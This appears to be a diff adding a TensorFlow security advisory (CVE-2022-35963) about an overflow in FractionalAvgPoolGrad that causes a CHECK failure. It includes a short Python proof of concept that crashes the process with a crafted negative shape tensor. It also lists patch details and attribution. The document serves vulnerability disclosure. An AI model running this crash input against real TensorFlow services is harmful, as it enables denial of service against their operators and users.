@@ -1,0 +1,21 @@
+<h2>TFSA-2022-095: <code>CHECK</code> failures in <code>FractionalAvgPoolGrad</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35963</p>
+<h3>Impact</h3>
+<p>The implementation of <code>FractionalAvgPoolGrad</code> does not fully validate the input <code>orig_input_tensor_shape</code>. This results in an overflow that results in a  <code>CHECK</code> failure which can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf</p>
+<p>overlapping = True
+orig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)
+out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)
+row_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
+col_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
+tf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad">03a659d7be9a1154fdf5eeac221e5950fec07dad</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
